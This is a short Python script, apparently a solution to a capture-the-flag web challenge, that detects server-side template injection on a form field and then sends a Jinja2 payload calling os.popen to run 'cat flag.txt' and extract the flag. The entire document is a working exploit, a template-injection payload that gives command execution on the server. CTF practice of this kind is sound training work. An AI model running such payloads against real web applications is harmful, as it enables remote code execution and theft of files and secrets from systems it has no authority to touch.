#!/usr/bin/env python3
import requests
import re

BASE_URL = "http://srv2.martiansonly.net:2222"

s = requests.Session()

# Check for SSTI
resp = s.post(BASE_URL, data={"date": "{{7*7}}"})

if "49" in resp.text:
    print("SSTI found")
else:
    print("SSTI not found")
    exit(1)

# Get the flag using SSTI
payload = "{{ namespace.__init__.__globals__.os.popen('cat flag.txt').read() }}"
resp = s.post(BASE_URL, data={"date": payload})

flag = re.findall(r"shctf\{.*\}", resp.text)[0]

print(f"Flag: {flag}")
